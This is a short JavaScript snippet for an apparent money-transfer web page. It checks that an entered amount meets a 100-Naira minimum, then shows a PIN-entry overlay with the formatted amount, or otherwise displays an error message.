document.addEventListener('DOMContentLoaded', () => {
    const amountInput = document.getElementById('amount');
    const continueBtn = document.getElementById('continue-btn');
    const pinOverlay = document.getElementById('pinOverlay');
    
    // Updated Predefined Values
    const MIN_TRANSFER = 100.00; // Minimum 100 Naira
    const REDIRECT_URL = "https://techbydigitalsolution.com/transfer/";

    continueBtn.addEventListener('click', () => {
        const val = parseFloat(amountInput.value);
        
        if (val >= MIN_TRANSFER) {
            // Update the PIN overlay to show Naira
            document.getElementById('confirmAmountDisplay').innerText = `₦${val.toLocaleString()}`;
            pinOverlay.style.display = 'flex';
            document.querySelectorAll('.pin-digit')[0].focus();
        } else {
            const error = document.getElementById('error-msg');
            error.innerText = `Minimum transfer is ₦${MIN_TRANSFER}`;
            error.style.visibility = 'visible';
        }
    });

    // Note: The generateSignature function remains the same as it 
    // hashes the raw numeric value, independent of the symbol.
});
